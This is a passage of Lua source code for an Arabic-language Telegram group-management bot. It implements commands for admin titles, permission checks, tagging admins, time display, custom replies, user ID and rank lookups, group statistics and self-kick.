https.request("https://api.telegram.org/bot"..token.."/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.sender_user_id_.."&can_change_info=false&can_delete_messages=false&can_invite_users=True&can_restrict_members=false&can_pin_messages=True&can_promote_members=false")
https.request("https://api.telegram.org/bot"..token.."/setChatAdministratorCustomTitle?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.sender_user_id_.."&custom_title="..timsh)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end

if text == ("مسح لقب") and msg.reply_to_message_id_ ~= 0 and Constructor(msg) then
function start_function(extra, result, success)
if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,' ⋄البوت ليس مشرف يرجى ترقيتي !') 
return false  
end
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n⋄العضو »> ['..data.first_name_..'](t.me/'..(data.username_ or 'SOPOWERB0T')..')'
status  = '\n⋄الايدي »> `'..result.sender_user_id_..'`\n⋄تم مسح لقبه من الجروب'
send(msg.chat_id_, msg.id_, usertext..status)
https.request("https://api.telegram.org/bot"..token.."/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.sender_user_id_.."&can_change_info=false&can_delete_messages=false&can_invite_users=false&can_restrict_members=false&can_pin_messages=false&can_promote_members=false")
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
if text and text:match("^مسح لقب @(.*)$") and Constructor(msg) then
local username = text:match("^مسح لقب @(.*)$")
if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,' ⋄البوت ليس مشرف يرجى ترقيتي !') 
return false  
end
function start_function(extra, result, success)
if result.id_ then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_,"⋄عذرا عزيزي هاذا ليس معرف عضو قد يكون قناه او مجموعه")
return false
end
usertext = '\n⋄العضو »> ['..result.title_..'](t.me/'..(username or 'SOPOWERB0T')..')'
status  = '\n⋄تم مسح لقبه من الجروب'
texts = usertext..status
send(msg.chat_id_, msg.id_, texts)
https.request("https://api.telegram.org/bot"..token.."/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.id_.."&can_change_info=false&can_delete_messages=false&can_invite_users=false&can_restrict_members=false&can_pin_messages=false&can_promote_members=false")
else
send(msg.chat_id_, msg.id_, '⚠¦ لا يوجد حساب بهاذا المعرف')
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false
end
if text == 'لقبي' and tonumber(msg.reply_to_message_id_) == 0 then
Ge = https.request("https://api.telegram.org/bot"..token.."/getChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..msg.sender_user_id_)
GeId = JSON.decode(Ge)
if not GeId.result.custom_title then
send(msg.chat_id_, msg.id_,'⋄مفيش لقب يتافه ') 
else
send(msg.chat_id_, msg.id_,'⋄لقبك هو : '..GeId.result.custom_title) 
end
end
if text == "فحص البوت" then
if not Manager2(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون مدير ثاني لاستخدام هذا الامر')
return false
end
local chek = https.request('https://api.telegram.org/bot'..token..'/getChatMember?chat_id='..msg.chat_id_..'&user_id='..bot_id)
local getInfo = JSON.decode(chek)
if getInfo.ok == true then
if getInfo.result.can_change_info == true then
INf = '❴ ✔️ ❵' 
else 
INf = '❴ ✖ ❵' 
end
if getInfo.result.can_delete_messages == true then
DEL = '❴ ✔️ ❵' 
else 
DEL = '❴ ✖ ❵' 
end
if getInfo.result.can_invite_users == true then
INv = '❴ ✔️ ❵' 
else
INv = '❴ ✖ ❵' 
end
if getInfo.result.can_pin_messages == true then
Pin = '❴ ✔️ ❵' 
else
Pin = '❴ ✖ ❵' 
end
if getInfo.result.can_restrict_members == true then
REs = '❴ ✔️ ❵' 
else 
REs = '❴ ✖ ❵' 
end
if getInfo.result.can_promote_members == true then
PRo = '❴ ✔️ ❵'
else
PRo = '❴ ✖ ❵'
end 
send(msg.chat_id_, msg.id_,'\n⋄صلاحيات البوت هي\n•┉ • ┉ • ┉ Joker ┉ • ┉ • ┉•\n⋄علامة ال {✔️} تعني مفعل\n⋄علامة ال {✖} تعني غير مفعل\n•┉ • ┉ • ┉ Joker ┉ • ┉ • ┉•\n⋄تغير معلومات المجموعة ↞ '..INf..'\n⋄مسح الرسائل ↞ '..DEL..'\n⋄حظر المستخدمين ↞ '..REs..'\n⋄دعوة المستخدمين ↞ '..INv..'\n⋄ثتبيت الرسالة ↞ '..Pin..'\n⋄اضافة مشرفين ↞ '..PRo)   
end
end

if text == 'صيح المشرفين' or text == "تاك للمشرفين" or text == "وين المشرفين" or text == "المشرفين" then
database:set(bot_id.."SOPOWERB0T:Tag:Admins:"..msg.chat_id_,true)
if database:get(bot_id.."SOPOWERB0T:Tag:Admins:"..msg.chat_id_) then 
tdcli_function ({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersAdministrators"},offset_ = 0,limit_ = 100},function(arg,data)
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,b)  
if b.username_ then 
User_id = "@"..b.username_
else
User_id = msg.sender_user_id_
end
local t = "\n⋄المستخدم ~ ["..User_id .."] يصيح المشرفين \n•┉ • ┉ • ┉ Joker ┉ • ┉ • ┉•\n"
k = 0
for i,v in pairs(data.members_) do
if bot_id ~= v.user_id_ then 
k = k + 1
local username = database:get(bot_id.."user:Name"..v.user_id_)
if database:get(bot_id..'user:Name'..v.user_id_) then
t = t..""..k.." → {[@"..database:get(bot_id..'user:Name'..v.user_id_).."]}\n"
else
t = t..""..k.." → {`"..v.user_id_.."`}\n"
end
end
end
send(msg.chat_id_, msg.id_,t)
end,nil)
end,nil)
end
end
if text == "الزمن" then
local time = https.request('https://devdeiveddev.ml/IP/timeEG.php')
local timezone = "الساعه الان بتوقيت القاهره : "..time.."\nالتاريخ : "..os.date("%Y/%m/%d")
send(msg.chat_id_, msg.id_,timezone)
end
if text == "الساعه" or text == 'الوقت' then
local time = https.request('https://devdeiveddev.ml/IP/timeEG.php')
local timezone = "الساعه الان بتوقيت القاهره : "..time
send(msg.chat_id_, msg.id_,timezone)
end
if text == "التاريخ" then
local timezone =  "التاريخ : "..os.date("%Y/%m/%d")
send(msg.chat_id_, msg.id_,timezone)
end
if text == ("الردود المتعدده") and CoSu(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
local ch = database:get(bot_id..'add:ch:username')
local chid = database:get(bot_id..'add:ch:id')
local url , res = https.request('https://api.telegram.org/bot'..token..'/getchat?chat_id='..chid)
local json = JSON.decode(url)
local inline = {{{text = json.result.title, url="t.me/"..ch}},} 
local teexxt = '⋄اهلا عزيزي \n⋄لا تستطيع استخدام البوت \n⋄يرجى الاشتراك بالقناه اولا \n⋄اشترك هنا [@'..ch..']'
if textchuser then
send_inline_key(msg.chat_id_,textchuser,nil,inline,msg.id_/2097152/0.5)
else
send_inline_key(msg.chat_id_,teexxt,nil,inline,msg.id_/2097152/0.5)
end
return false
end
local list = database:smembers(bot_id.."botss:Black:List:Rd:Sudo")
text = "\nقائمة ردود المتعدده \nٴ≪┉ ┉ ┉ ┉ ┉ 𝐃𝐑𝐠 ┉  ┉ ┉ ┉ ┉≫ٴ\n"
for k,v in pairs(list) do
db = "رساله "
text = text..""..k.." => {"..v.."} => {"..db.."}\n"
end
if #list == 0 then
text = "لا توجد ردود متعدده"
end
send(msg.chat_id_, msg.id_,"["..text.."]")
end
if text == "اضف رد متعدد" and CoSu(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
local ch = database:get(bot_id..'add:ch:username')
local chid = database:get(bot_id..'add:ch:id')
local url , res = https.request('https://api.telegram.org/bot'..token..'/getchat?chat_id='..chid)
local json = JSON.decode(url)
local inline = {{{text = json.result.title, url="t.me/"..ch}},} 
local teexxt = '⋄اهلا عزيزي \n⋄لا تستطيع استخدام البوت \n⋄يرجى الاشتراك بالقناه اولا \n⋄اشترك هنا [@'..ch..']'
if textchuser then
send_inline_key(msg.chat_id_,textchuser,nil,inline,msg.id_/2097152/0.5)
else
send_inline_key(msg.chat_id_,teexxt,nil,inline,msg.id_/2097152/0.5)
end
return false
end
database:set(bot_id.."botss:Black:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_,true)
return send(msg.chat_id_, msg.id_,"⋄ارسل الرد الذي اريد اضافته")
end
if text == "مسح رد متعدد" and CoSu(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
local ch = database:get(bot_id..'add:ch:username')
local chid = database:get(bot_id..'add:ch:id')
local url , res = https.request('https://api.telegram.org/bot'..token..'/getchat?chat_id='..chid)
local json = JSON.decode(url)
local inline = {{{text = json.result.title, url="t.me/"..ch}},} 
local teexxt = '⋄اهلا عزيزي \n⋄لا تستطيع استخدام البوت \n⋄يرجى الاشتراك بالقناه اولا \n⋄اشترك هنا [@'..ch..']'
if textchuser then
send_inline_key(msg.chat_id_,textchuser,nil,inline,msg.id_/2097152/0.5)
else
send_inline_key(msg.chat_id_,teexxt,nil,inline,msg.id_/2097152/0.5)
end
return false
end
database:set(bot_id.."botss:Black:Set:On"..msg.sender_user_id_..":"..msg.chat_id_,true)
return send(msg.chat_id_, msg.id_,"⋄ارسل الان الكلمه لمسحها ")
end
if text then  
local test = database:get(bot_id.."botss:Black:Text:Sudo:Bot"..msg.sender_user_id_..":"..msg.chat_id_)
if database:get(bot_id.."botss:Black:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_) == "true1" then
database:set(bot_id.."botss:Black:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_,'rd1')
if text then   
text = text:gsub('"',"") 
text = text:gsub('"',"") 
text = text:gsub("`","") 
text = text:gsub("*","") 
database:set(bot_id.."botss:Black:Add:Rd:Sudo:Text"..test, text)  
end  
send(msg.chat_id_, msg.id_,"⋄تم حفظ الرد الاول ارسل الرد الثاني")
return false  
end  
end
if text then  
local test = database:get(bot_id.."botss:Black:Text:Sudo:Bot"..msg.sender_user_id_..":"..msg.chat_id_)
if database:get(bot_id.."botss:Black:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_) == "rd1" then
database:set(bot_id.."botss:Black:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_,'rd2')
if text then   
text = text:gsub('"',"") 
text = text:gsub('"',"") 
text = text:gsub("`","") 
text = text:gsub("*","") 
database:set(bot_id.."botss:Black:Add:Rd:Sudo:Text1"..test, text)  
end  
send(msg.chat_id_, msg.id_,"⋄تم حفظ الرد الثاني ارسل الرد الثالث")
return false  
end  
end
if text then  
local test = database:get(bot_id.."botss:Black:Text:Sudo:Bot"..msg.sender_user_id_..":"..msg.chat_id_)
if database:get(bot_id.."botss:Black:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_) == "rd2" then
database:set(bot_id.."botss:Black:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_,'rd3')
if text then   
text = text:gsub('"',"") 
text = text:gsub('"',"") 
text = text:gsub("`","") 
text = text:gsub("*","") 
database:set(bot_id.."botss:Black:Add:Rd:Sudo:Text2"..test, text)  
end  
send(msg.chat_id_, msg.id_,"⋄تم حفظ الرد")
return false  
end  
end
if text then
local Text = database:get(bot_id.."botss:Black:Add:Rd:Sudo:Text"..text)   
local Text1 = database:get(bot_id.."botss:Black:Add:Rd:Sudo:Text1"..text)   
local Text2 = database:get(bot_id.."botss:Black:Add:Rd:Sudo:Text2"..text)   
if Text or Text1 or Text2 then 
local texting = {
Text,
Text1,
Text2
}
Textes = math.random(#texting)
send(msg.chat_id_, msg.id_,texting[Textes])
end

-------------------------------
if text and text:match("^غادر (-%d+)$") then
local GP_ID = {string.match(text, "^(غادر) (-%d+)$")}
if SudoBot2(msg) and not database:get(bot_id.."Left:Bot"..msg.chat_id_) then 
tdcli_function ({ID = "ChangeChatMemberStatus",chat_id_=GP_ID[2],user_id_=bot_id,status_={ID = "ChatMemberStatusLeft"},},function(e,g) end, nil) 
send(GP_ID[2], msg.id_,"⋄تم مغادرة المجموعه بامر من مطور البوت") 
database:srem(bot_id.."Chek:Groups",GP_ID[2])  
send(msg.chat_id_, msg.id_,"⋄تم مغادرة المجموعه") 
end
return false 
end
if text == "غادر" then  
if SudoBot2(msg) and not database:get(bot_id..'Left:Bot'..msg.chat_id_)  then 
tdcli_function ({ID = "ChangeChatMemberStatus",chat_id_=msg.chat_id_,user_id_=bot_id,status_={ID = "ChatMemberStatusLeft"},},function(e,g) end, nil) 
send(msg.chat_id_, msg.id_,' ⋄تم مغادرة الجروب') 
database:srem(bot_id..'Chek:Groups',msg.chat_id_)
end
return false  
end
if text == 'الاحصائيات' then
if SudoBot3(msg)  then 
local Groups = database:scard(bot_id..'Chek:Groups')  
local Users = database:scard(bot_id..'User_Bot')  
Text = ' الاحصائيات ☉ \n'..' ⋄عدد الجروبات »> {`'..Groups..'`}'..'\n⋄عدد المشتركين »> {`'..Users..'`}'
send(msg.chat_id_, msg.id_,Text) 
end
return false
end
if text == ("مسح العام") then
if not SudoBot2(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الثاني لاستخدام هذا الامر')
return false
end
database:del(bot_id..'GBan:User')
database:del(bot_id..'Gmute:User')
send(msg.chat_id_, msg.id_, '\n⋄تم مسح قائمه (الكتم-الحظر) العام')
return false
end
if text == 'الجروبات' then
if SudoBot3(msg)  then 
local Groups = database:scard(bot_id..'Chek:Groups')  
local Users = database:scard(bot_id..'User_Bot')  
Text = ' ⋄عدد الجروبات »> {`'..Groups..'`}'
send(msg.chat_id_, msg.id_,Text) 
end
return false
end
if text == 'المشتركين' then
if SudoBot3(msg)  then 
local Groups = database:scard(bot_id..'Chek:Groups')  
local Users = database:scard(bot_id..'User_Bot')  
Text = ' ⋄عدد المشتركين »> {`'..Users..'`}'
send(msg.chat_id_, msg.id_,Text) 
end
return false
end
if text == 'تفعيل المغادره' then
if not SudoBot2(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الثاني لاستخدام هذا الامر')
return false
end   
if database:get(bot_id..'Left:Bot'..msg.chat_id_) then
Text = ' ⋄تم تفعيل مغادرة البوت'
database:del(bot_id..'Left:Bot'..msg.chat_id_)  
else
Text = ' ⋄بالتاكيد تم تفعيل مغادرة البوت'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تعطيل المغادره' then
if not SudoBot2(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الثاني لاستخدام هذا الامر')
return false
end  
if not database:get(bot_id..'Left:Bot'..msg.chat_id_) then
Text = ' ⋄تم تعطيل مغادرة البوت'
database:set(bot_id..'Left:Bot'..msg.chat_id_,true)   
else
Text = ' ⋄بالتاكيد تم تعطيل مغادرة البوت'
end
send(msg.chat_id_, msg.id_, Text) 
end

if text == 'تفعيل الردود' then
if not Manager2(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون مدير ثاني لاستخدام هذا الامر')
return false
end   
if database:get(bot_id..'Reply:Manager'..msg.chat_id_) then
Text = ' ⋄تم تفعيل الردود'
database:del(bot_id..'Reply:Manager'..msg.chat_id_)  
else
Text = ' ⋄تم تفعيل الردود'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تعطيل الردود' then
if not Manager2(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون مدير ثاني لاستخدام هذا الامر')
return false
end  
if not database:get(bot_id..'Reply:Manager'..msg.chat_id_) then
database:set(bot_id..'Reply:Manager'..msg.chat_id_,true)  
Text = '\n⋄تم تعطيل الردود' 
else
Text = '\n⋄بالتاكيد تم تعطيل الردود'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تفعيل الردود العامه' then
if not Manager2(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون مدير ثاني لاستخدام هذا الامر')
return false
end   
if database:get(bot_id..'Reply:Sudo'..msg.chat_id_) then
database:del(bot_id..'Reply:Sudo'..msg.chat_id_)  
Text = '\n⋄تم تفعيل الردود العامه' 
else
Text = '\n⋄بالتاكيد تم تفعيل الردود العامه'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تعطيل الردود العامه' then
if not Manager2(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون مدير ثاني لاستخدام هذا الامر')
return false
end  
if not database:get(bot_id..'Reply:Sudo'..msg.chat_id_) then
database:set(bot_id..'Reply:Sudo'..msg.chat_id_,true)   
Text = '\n⋄تم تعطيل الردود العامه' 
else
Text = '\n⋄بالتاكيد تم تعطيل الردود العامه'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تفعيل الايدي' then
if not Manager2(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون مدير ثاني لاستخدام هذا الامر')
return false
end   
if database:get(bot_id..'Bot:Id'..msg.chat_id_)  then
database:del(bot_id..'Bot:Id'..msg.chat_id_) 
Text = '\n⋄تم تفعيل الايدي' 
else
Text = '\n⋄بالتاكيد تم تفعيل الايدي'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تعطيل الايدي' then
if not Manager2(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون مدير ثاني لاستخدام هذا الامر')
return false
end  
if not database:get(bot_id..'Bot:Id'..msg.chat_id_)  then
database:set(bot_id..'Bot:Id'..msg.chat_id_,true) 
Text = '\n⋄تم تعطيل الايدي' 
else
Text = '\n⋄بالتاكيد تم تعطيل الايدي'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تفعيل الايدي بالصوره' then
if not Manager2(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون مدير ثاني لاستخدام هذا الامر')
return false
end   
if database:get(bot_id..'Bot:Id:Photo'..msg.chat_id_)  then
database:del(bot_id..'Bot:Id:Photo'..msg.chat_id_) 
Text = '\n⋄تم تفعيل الايدي بالصور' 
else
Text = '\n⋄بالتاكيد تم تفعيل الايدي بالصوره'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تعطيل الايدي بالصوره' then
if not Manager2(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون مدير ثاني لاستخدام هذا الامر')
return false
end  
if not database:get(bot_id..'Bot:Id:Photo'..msg.chat_id_)  then
database:set(bot_id..'Bot:Id:Photo'..msg.chat_id_,true) 
Text = '\n⋄تم تعطيل الايدي بالصوره' 
else
Text = '\n⋄بالتاكيد تم تعطيل الايدي بالصوره'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تفعيل الحظر' and Constructor(msg) then   
if database:get(bot_id..'Lock:kick'..msg.chat_id_)  then
database:del(bot_id..'Lock:kick'..msg.chat_id_) 
Text = '\n⋄تم تفعيل الحظر' 
else
Text = '\n⋄بالتاكيد تم تفعيل الحظر'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تعطيل الحظر' and Constructor(msg) then  
if not database:get(bot_id..'Lock:kick'..msg.chat_id_)  then
database:set(bot_id..'Lock:kick'..msg.chat_id_,true) 
Text = '\n⋄تم تعطيل الحظر' 
else
Text = '\n⋄بالتاكيد تم تعطيل الحظر'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تفعيل الرفع' and Constructor(msg) then   
if database:get(bot_id..'Lock:Add:Bot'..msg.chat_id_)  then
database:del(bot_id..'Lock:Add:Bot'..msg.chat_id_) 
Text = '\n⋄تم تفعيل الرفع' 
else
Text = '\n⋄بالتاكيد تم تفعيل الرفع'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تعطيل الرفع' and Constructor(msg) then  
if not database:get(bot_id..'Lock:Add:Bot'..msg.chat_id_)  then
database:set(bot_id..'Lock:Add:Bot'..msg.chat_id_,true) 
Text = '\n⋄تم تعطيل الرفع' 
else
Text = '\n⋄بالتاكيد تم تعطيل الرفع'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'ايدي' and tonumber(msg.reply_to_message_id_) > 0 then
function start_function(extra, result, success)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(extra,data) 
local Msguser = tonumber(database:get(bot_id..'Msg_User'..msg.chat_id_..':'..result.sender_user_id_) or 1) 
local Contact = tonumber(database:get(bot_id..'Add:Contact'..msg.chat_id_..':'..result.sender_user_id_) or 0) 
local NUMPGAME = tonumber(database:get(bot_id..'NUM:GAMES'..msg.chat_id_..result.sender_user_id_) or 0)
local edit = tonumber(database:get(bot_id..'edits'..msg.chat_id_..result.sender_user_id_) or 0)
local rtp = Rutba(result.sender_user_id_,msg.chat_id_)
local username = ('[@'..data.username_..']' or 'لا يوجد')
local iduser = result.sender_user_id_
send(msg.chat_id_, msg.id_,' ⋄ايديه ~⪼ '..iduser..'\n⋄معرفه ~⪼ '..username..'\n⋄رتبته ~⪼ '..rtp..'\n⋄تعديلاته ~⪼ '..edit..'\n⋄نقاطه ~⪼ '..NUMPGAME..'\n⋄جهاته ~⪼ '..Contact..'\n⋄رسائله ~⪼ '..Msguser..'')
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
end
if text and text:match("^ايدي @(.*)$") then
local username = text:match("^ايدي @(.*)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
local ch = database:get(bot_id..'add:ch:username')
local chid = database:get(bot_id..'add:ch:id')
local url , res = https.request('https://api.telegram.org/bot'..token..'/getchat?chat_id='..chid)
local json = JSON.decode(url)
local inline = {{{text = json.result.title, url="t.me/"..ch}},} 
local teexxt = '⋄اهلا عزيزي \n⋄لا تستطيع استخدام البوت \n⋄يرجى الاشتراك بالقناه اولا \n⋄اشترك هنا [@'..ch..']'
if textchuser then
send_inline_key(msg.chat_id_,textchuser,nil,inline,msg.id_/2097152/0.5)
else
send_inline_key(msg.chat_id_,teexxt,nil,inline,msg.id_/2097152/0.5)
end
return false
end
function start_function(extra, result, success)
if result.id_ then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_,"⋄عذرا عزيزي هاذا ليس معرف عضو قد يكون قناه او مجموعه")
return false
end
tdcli_function ({ID = "GetUser",user_id_ = result.id_},function(extra,data) 
local Msguser = tonumber(database:get(bot_id..'Msg_User'..msg.chat_id_..':'..result.id_) or 1) 
local Contact = tonumber(database:get(bot_id..'Add:Contact'..msg.chat_id_..':'..result.id_) or 0) 
local NUMPGAME = tonumber(database:get(bot_id..'NUM:GAMES'..msg.chat_id_..result.id_) or 0)
local edit = tonumber(database:get(bot_id..'edits'..msg.chat_id_..result.id_) or 0)
local rtp = Rutba(result.id_,msg.chat_id_)
local username = ('[@'..data.username_..']' or 'لا يوجد')
local iduser = result.id_
send(msg.chat_id_, msg.id_,' ⋄ايديه ~⪼('..iduser..')\n⋄معرفه ~⪼('..username..')\n⋄رتبته ~⪼('..rtp..')\n⋄تعديلاته ~⪼('..edit..')\n⋄نقاطه ~⪼('..NUMPGAME..')\n⋄جهاته ~⪼('..Contact..')\n⋄رسائله ~⪼('..Msguser..')')
end,nil)
else
send(msg.chat_id_, msg.id_,' ⋄المعرف غير صحيح ')
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
end
if text == 'رتبتي' then
local rtp = Rutba(msg.sender_user_id_,msg.chat_id_)
send(msg.chat_id_, msg.id_,' ⋄رتبتك في البوت »> '..rtp)
end
if text == "اسمي"  then 
tdcli_function({ID="GetUser",user_id_=msg.sender_user_id_},function(extra,result,success)
if result.first_name_  then
first_name = ' ⋄اسمك الاول »> {`'..(result.first_name_)..'`}'
else
first_name = ''
end   
if result.last_name_ then 
last_name = ' ⋄اسمك الثاني »> {`'..result.last_name_..'`}' 
else
last_name = ''
end      
send(msg.chat_id_, msg.id_,first_name..'\n'..last_name) 
end,nil)
end 
if text == 'ايديي' then
send(msg.chat_id_, msg.id_,' ⋄ايديك »> '..msg.sender_user_id_)
end
if text == 'الرتبه' and tonumber(msg.reply_to_message_id_) > 0 then
function start_function(extra, result, success)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(extra,data) 
local rtp = Rutba(result.sender_user_id_,msg.chat_id_)
local username = ' ['..data.first_name_..'](t.me/'..(data.username_ or 'SOPOWERB0T')..')'
local iduser = result.sender_user_id_
send(msg.chat_id_, msg.id_,'*- العضو »> (*'..username..'*)\n- الرتبه »> ('..rtp..')*\n')
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
end
---------
if text and text:match("^الرتبه @(.*)$") then
local username = text:match("^الرتبه @(.*)$")
function start_function(extra, result, success)
if result.id_ then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_,"⋄عذرا عزيزي هاذا ليس معرف عضو قد يكون قناه او مجموعه")
return false
end
tdcli_function ({ID = "GetUser",user_id_ = result.id_},function(extra,data) 
local rtp = Rutba(result.id_,msg.chat_id_)
local username = ('[@'..data.username_..']' or 'لا يوجد')
local iduser = result.id_
send(msg.chat_id_, msg.id_,'*- العضو »> (*'..username..'*)\n- الرتبه »> ('..rtp..')*\n')
end,nil)
else
send(msg.chat_id_, msg.id_,'- المعرف غير صحيح ')
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
end
if text == 'كشف' and tonumber(msg.reply_to_message_id_) > 0 then
function start_function(extra, result, success)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(extra,data) 
local rtp = Rutba(result.sender_user_id_,msg.chat_id_)
local username = ('[@'..data.username_..']' or 'لا يوجد')
local iduser = result.sender_user_id_
send(msg.chat_id_, msg.id_,' ⋄الايدي »> ('..iduser..')\n⋄المعرف »> ('..username..')\n⋄الرتبه »> ('..rtp..')\n⋄نوع الكشف »> بالرد')
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
end
---------
if text and text:match("^كشف @(.*)$") then
local username = text:match("^كشف @(.*)$")
function start_function(extra, result, success)
if result.id_ then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_,"⋄عذرا عزيزي هاذا ليس معرف عضو قد يكون قناه او مجموعه")
return false
end
tdcli_function ({ID = "GetUser",user_id_ = result.id_},function(extra,data) 
local rtp = Rutba(result.id_,msg.chat_id_)
local username = ('[@'..data.username_..']' or 'لا يوجد')
local iduser = result.id_
send(msg.chat_id_, msg.id_,' ⋄الايدي »> ('..iduser..')\n⋄المعرف »> ('..username..')\n⋄الرتبه »> ('..rtp..')\n⋄نوع الكشف »> بالمعرف')
end,nil)
else
send(msg.chat_id_, msg.id_,' ⋄المعرف غير صحيح')
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
end
if text and text:match("^كشف (.*)$") then
local userid = text:match("^كشف (.*)$")
function start_function(extra, result, success)
if userid then
tdcli_function ({ID = "GetUser",user_id_ = userid},function(extra,data) 
local rtp = Rutba(userid,msg.chat_id_)
local username = ('[@'..data.username_..']' or 'لا يوجد')
local iduser = userid
send(msg.chat_id_, msg.id_,' ⋄الايدي »> ('..iduser..')\n⋄المعرف »> ('..username..')\n⋄الرتبه »> ('..rtp..')\n⋄نوع الكشف »> بلايدي')
end,nil)
else
send(msg.chat_id_, msg.id_,' ⋄لو اجد صاحب الايدي')
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
end
if text==('عدد الجروب') then
if not Mod(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
return false
end  
if msg.can_be_deleted_ == false then 
send(msg.chat_id_,msg.id_," ⋄البوت ليس ادمن \n") 
return false  
end 
tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,ta) 
tdcli_function({ID="GetChannelFull",channel_id_ = msg.chat_id_:gsub('-100','')},function(arg,data) 
local sofi = ' ⋄عدد الادمنيه : '..data.administrator_count_..
'\n\n⋄عدد المطرودين : '..data.kicked_count_..
'\n\n⋄عدد الاعضاء : '..data.member_count_..
'\n\n⋄عدد رسائل الجروب : '..(msg.id_/2097152/0.5)..
'\n\n⋄اسم الجروب : ['..ta.title_..']'
send(msg.chat_id_, msg.id_, sofi) 
end,nil)
end,nil)
end 
if text == 'اطردني' or text == 'طردني' then
if not database:get(bot_id..'Cick:Me'..msg.chat_id_) then
if Can_or_NotCan(msg.sender_user_id_, msg.chat_id_) == true then
send(msg.chat_id_, msg.id_, '\n⋄عذرا لا استطيع طرد ( '..Rutba(msg.sender_user_id_,msg.chat_id_)..' )')
return false
end
tdcli_function({ID="ChangeChatMemberStatus",chat_id_=msg.chat_id_,user_id_=msg.sender_user_id_,status_={ID="ChatMemberStatusKicked"},},function(arg,data) 
if (data and data.code_ and data.code_ == 400 and data.message_ == "CHAT_ADMIN_REQUIRED") then 
send(msg.chat_id_, msg.id_,' ⋄ليس لدي صلاحية حظر المستخدمين يرجى تفعيلها !') 
return false  
end
if (data and data.code_ and data.code_ == 3) then 
send(msg.chat_id_, msg.id_,' ⋄البوت ليس ادمن يرجى ترقيتي !') 
return false  
end
if data and data.code_ and data.code_ == 400 and data.message_ == "USER_ADMIN_INVALID" then 
send(msg.chat_id_, msg.id_,' ⋄عذرا لا استطيع طرد ادمنية الجروب') 
return false  
end
if data and data.ID and data.ID == 'Ok' then
